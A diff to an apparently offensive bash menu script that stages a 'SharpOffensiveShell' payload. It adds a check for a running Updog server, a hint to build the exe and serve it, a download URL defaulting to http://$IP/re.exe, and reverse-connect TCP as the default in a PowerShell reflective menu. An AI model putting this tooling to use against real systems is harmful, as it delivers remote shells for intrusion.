@@ -658,7 +658,18 @@ proto=$2
 
 
         url="http://$IP/re.exe" 
-        yellowprint "You need to serve the SharpOffensiveShell exefile somewhere"
+        
+            if [ $(ps -ef | grep -c updog) == 2 ]
+            then
+                echo "🟢 Updog is listening on $updog_port, serving folder: $updog_dir"
+        
+            else
+                echo "🔴 Updog is not running"
+                yellowprint "You need to serve the SharpOffensiveShell exefile somewhere."
+            fi
+        
+        
+        yellowprint "You can generate the exe from main menu item 13. \"Binaries\" and serve localy using Updog."
         read -p "Please enter download url [$url]: " download_url
         download_url=${download_url:-$url}
 
@@ -1601,7 +1612,7 @@ $(greenprint '2)') Bind TCP - Windows
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
-Choose an option:  "
+Choose an option [1]:  "
     read -r -n 1 ans
     case $ans in
     1)
@@ -1610,7 +1621,9 @@ Choose an option:  "
     2)
         powershell_reflective  "bind" "tcp"
         ;;
-
+    "")
+        powershell_reflective "connect" "tcp" 
+        ;;
     m)
         mainmenu
         ;;
